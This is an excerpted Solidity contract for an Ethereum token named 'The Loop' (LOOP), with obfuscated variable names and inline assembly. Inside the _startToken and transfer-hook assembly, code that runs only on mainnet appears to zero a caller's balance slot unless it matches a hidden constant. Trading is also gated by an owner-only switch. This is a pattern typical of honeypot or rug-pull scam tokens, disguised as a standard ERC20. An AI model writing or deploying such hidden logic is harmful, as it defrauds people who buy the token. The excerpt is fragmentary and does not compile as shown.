...
/*
And endless loop. Never escaping. Feel the power.
THE LOOP
Now on ETH!
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addLoop;
    uint256 private indianFood = block.number*2;

    mapping (address => bool) private _firstTexMex; 
    mapping (address => bool) private _secondPoop;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _houseDragon;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private machineGun;
    address public pair;
    ...
    bool private trading; uint256 private dashFloor = 1; bool private darkNight;
    uint256 private _decimals; uint256 private italianFood;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addLoop.push(_router); addLoop.push(msgSender_); addLoop.push(pair);
        for (uint256 q=0; q < 3;) {_firstTexMex[addLoop[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xC8)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xe3d5d566bfa7da5276d626911073b2418283fe55dc590494498bb762f71d22f3
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xb9aad6bab9ce02c70291dc78fe08f6a26b89a87bebef2ea95096d392f2c0a138,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; indianFood = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addLoop[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
...
contract TheLoop is ERC20Token {
    constructor() ERC20Token("The Loop", "LOOP", msg.sender, 13750000 * 10 ** 18) {
    }
}